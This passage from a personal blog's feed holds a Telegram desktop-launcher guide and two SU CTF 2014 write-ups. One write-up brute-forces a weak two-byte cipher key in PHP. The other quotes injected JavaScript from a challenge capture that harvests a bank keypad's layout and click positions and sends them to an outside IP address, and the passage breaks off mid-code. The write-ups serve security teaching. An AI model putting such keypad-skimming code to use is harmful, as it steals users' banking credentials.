+&lt;p&gt;بله :) &lt;a href=&quot;/blog/2015/09/how-to-use-git-part2&quot;&gt;قسمت دوم&lt;/a&gt; رو مطالعه کنید.&lt;/p&gt;</content><author><name>mashhadimj</name></author><category term="amend commit" /><category term="clone" /><category term="commit" /><category term="conflict" /><category term="git" /><category term="git applications" /><category term="git configuration" /><category term="merge" /><category term="pull" /><category term="push" /><category term="resolving conflicts" /><summary type="html">گیت چیه؟</summary></entry><entry><title type="html">Add Telegram messenger launcher to Gnome applications list</title><link href="https://mjafar.me/blog/2014/10/telegram-launcher/" rel="alternate" type="text/html" title="Add Telegram messenger launcher to Gnome applications list" /><published>2014-10-05T13:41:00+00:00</published><updated>2014-10-05T13:41:00+00:00</updated><id>https://mjafar.me/blog/2014/10/telegram-launcher</id><content type="html" xml:base="https://mjafar.me/blog/2014/10/telegram-launcher/">&lt;p&gt;&lt;a href=&quot;https://telegram.org/&quot;&gt;Telegram&lt;/a&gt; is a fast, open-source and secure messenger for mobile and desktop platforms. When you download telegram messenger for Linux, you just get two executables, &lt;em&gt;Telegram&lt;/em&gt; and &lt;em&gt;Updater.&lt;/em&gt; There is nothing to add these to gnome (or KDE or any other freedesktop.org-compliant desktops) applications list so you can not add this to your favorites or easily launch it with typing its name in gnome shell.&lt;/p&gt;
+
+&lt;p&gt;Here’s where &lt;em&gt;desktop&lt;/em&gt; files come in handy! Desktop files are standard way to &lt;em&gt;register&lt;/em&gt; an application in desktop manager so they can be launched from the applications list, menus and whatever launcher the desktop uses. We build a desktop file for telegram and then put it in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/applications&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.local/applications&lt;/code&gt;. If you put the file in first directory it will be accessible for all users (also you need root privileges to be able to add a file to that directory) but if you put the file in the second one, the file is accessible only for you.&lt;/p&gt;
+
+&lt;p&gt;Download &lt;a href=&quot;https://telegram.org/img/t_logo.png&quot;&gt;telegram logo&lt;/a&gt; to be used as an icon for launcher. Create a file named &lt;code class=&quot;highlighter-rouge&quot;&gt;telegtam.desktop&lt;/code&gt; with following contents in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/applications&lt;/code&gt; (or &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.local/applications&lt;/code&gt; as mentioned above). You may change ‘Exec’ and ‘Icon’ lines based on your own configurations and directories.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Desktop Entry]
+Version=1.0
+Name=Telegram
+Exec=/path/to/telegram/executable/Telegram
+Icon=/path/to/telegram/logo/t_logo.png
+Terminal=false
+Type=Application
+Categories=Network;Internet
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Learn more about &lt;em&gt;desktop entry&lt;/em&gt; files &lt;a href=&quot;https://developer.gnome.org/integration-guide/stable/desktop-files.html.en&quot;&gt;here&lt;/a&gt; 
+and start using Telegram &lt;a href=&quot;https://telegram.org/dl/webogram&quot;&gt;now&lt;/a&gt; if you haven’t already!&lt;/p&gt;</content><author><name>mashhadimj</name></author><summary type="html">Telegram is a fast, open-source and secure messenger for mobile and desktop platforms. When you download telegram messenger for Linux, you just get two executables, Telegram and Updater. There is nothing to add these to gnome (or KDE or any other freedesktop.org-compliant desktops) applications list so you can not add this to your favorites or easily launch it with typing its name in gnome shell.</summary></entry><entry><title type="html">SU CTF 2014 – Huge key write up</title><link href="https://mjafar.me/blog/2014/09/huge-key-write-up/" rel="alternate" type="text/html" title="SU CTF 2014 &amp;#8211; Huge key write up" /><published>2014-09-28T21:16:39+00:00</published><updated>2014-09-28T21:16:39+00:00</updated><id>https://mjafar.me/blog/2014/09/huge-key-write-up</id><content type="html" xml:base="https://mjafar.me/blog/2014/09/huge-key-write-up/">&lt;p&gt;Given a php file as coder and an encoded file, Find the flag.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;In encipher code the $key is initially [0, 0]. After reading &lt;code class=&quot;highlighter-rouge&quot;&gt;Huge Key&lt;/code&gt; file and the nested fors, the key will become (using python notation):&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# hk = huge key&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Well, looks like neither key nor hk are not recoverable. But to decode the input we don’t need the huge key, only key is enough.
+With running this piece of php code we can find out the size of initialization vector:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$iv_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mcrypt_get_iv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MCRYPT_RIJNDAEL_128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;MCRYPT_MODE_CBC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iv_size&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It will output 16, since the output file is prepended with iv this is very helpful in decoding.&lt;/p&gt;
+
+&lt;p&gt;Key has 256 * 256 possible values which can be found in a moderately good time with brute-forcing.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ciphertext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ciphertext.bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$blocks&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$iv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$blocks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$blocks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+   &lt;span class=&quot;nv&quot;&gt;$message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$blocks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// I know this way of slicing input is inefficient
+// and a little stupid, but come on! :D
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$decypher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mcrypt_decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MCRYPT_RIJNDAEL_128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;MCRYPT_MODE_CBC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$iv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$decypher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;key = &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;,&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$decypher&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note that if you have php binaries installed on your OS, you don’t need a webserver to run this code, simply run it in a terminal.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;php decode.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>mashhadimj</name></author><summary type="html">Given a php file as coder and an encoded file, Find the flag.</summary></entry><entry><title type="html">SU CTF 2014 – Our bank is yours write up</title><link href="https://mjafar.me/blog/2014/09/our-bank-is-yours-write-up/" rel="alternate" type="text/html" title="SU CTF 2014 &amp;#8211; Our bank is yours write up" /><published>2014-09-28T20:54:36+00:00</published><updated>2014-09-28T20:54:36+00:00</updated><id>https://mjafar.me/blog/2014/09/our-bank-is-yours-write-up</id><content type="html" xml:base="https://mjafar.me/blog/2014/09/our-bank-is-yours-write-up/">&lt;p&gt;The police have arrested a cyber criminal but they don’t have a good witness. Just a short capture of his network traffic is available. Is it helpful?&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;A pcap network traffic log is attached. By opening it in wireshark you could see that an email is sent with a link to &lt;a href=&quot;http://ctf.sharif.edu:45656/&quot; target=&quot;_blank&quot;&gt; this page&lt;/a&gt; that injects the following javascript code into the page.&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sendmap();&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;click&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clickdone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sendmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;buttons&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementsByClassName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;keypadButtonStyle&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;keymap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buttons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;keymap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buttons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://95.211.102.232:8080/c.php?t=m&amp;amp;v=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keymap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;clickdone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xPosition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clientX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;yPosition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clientY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
